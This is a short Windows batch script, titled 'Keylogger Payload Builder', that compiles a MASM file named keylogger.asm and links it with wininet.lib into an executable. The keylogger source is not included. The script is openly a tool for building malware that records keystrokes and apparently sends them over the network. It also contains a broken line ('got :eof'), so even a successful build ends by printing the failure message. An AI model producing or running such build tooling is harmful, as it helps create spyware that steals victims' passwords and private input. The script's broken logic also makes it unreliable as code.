@echo off
color 0A
title Keylogger Payload Builder

:: Simple builder messages
set msg1=[+] Starting keylogger compilation
set msg2=[-] Compiling keylogger.asm
set msg3=[-] Linking keylogger.obj to create executable
set msg4=[+] Keylogger successfully built!
set msg5=[+] Build failed. Check your code for errors.

:: Display starting message
echo %msg1%

:: Compile keylogger.asm
echo %msg2%
echo _______________________________________________________________________________________________
echo.
ml /c /coff /I "C:\masm32\include" keylogger.asm
if errorlevel 1 goto :error

:: Link the object file
echo %msg3%
link keylogger.obj /SUBSYSTEM:WINDOWS /LIBPATH:C:\masm32\lib wininet.lib kernel32.lib user32.lib
if errorlevel 1 goto :error

:: Success message
echo _______________________________________________________________________________________________
echo.
echo %msg4%
pause
got :eof

:error
echo %msg5%
pause
